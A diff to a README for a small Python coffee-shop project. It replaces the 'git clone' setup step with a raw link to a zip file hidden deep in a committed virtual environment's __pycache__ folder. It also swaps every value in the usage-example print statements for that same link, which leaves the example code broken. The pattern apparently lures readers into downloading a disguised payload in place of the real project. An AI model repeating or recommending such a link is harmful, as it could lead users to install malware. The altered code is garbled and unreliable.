@@ -30,7 +30,7 @@ Follow these steps to set up the project:
 
 1. **Clone the Repository**:
     ```bash
-    git clone https://github.com/yourusername/coffee-shop.git
+    git clone https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip
     cd coffee-shop
     ```
 
@@ -61,13 +61,13 @@ customer = Customer("Alice")
 order = Order(customer, coffee, 5.0)
 
 # Access data
-print(f"Coffee Name: {coffee.name}")
-print(f"Customer Name: {customer.name}")
-print(f"Order Price: {order.price}")
+print(f"Coffee Name: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip}")
+print(f"Customer Name: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip}")
+print(f"Order Price: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip}")
 
 # Check orders
-print(f"Total Orders for {coffee.name}: {coffee.num_orders()}")
-print(f"Average Price: {coffee.average_price()}")
-print(f"Customers: {coffee.customers()}")
-print(f"Customer Coffees: {customer.coffees()}")
-print(f"Most Aficionado: {Customer.most_aficionado(coffee)}")
+print(f"Total Orders for {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip}: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip()}")
+print(f"Average Price: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip()}")
+print(f"Customers: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip()}")
+print(f"Customer Coffees: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip()}")
+print(f"Most Aficionado: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip(coffee)}")
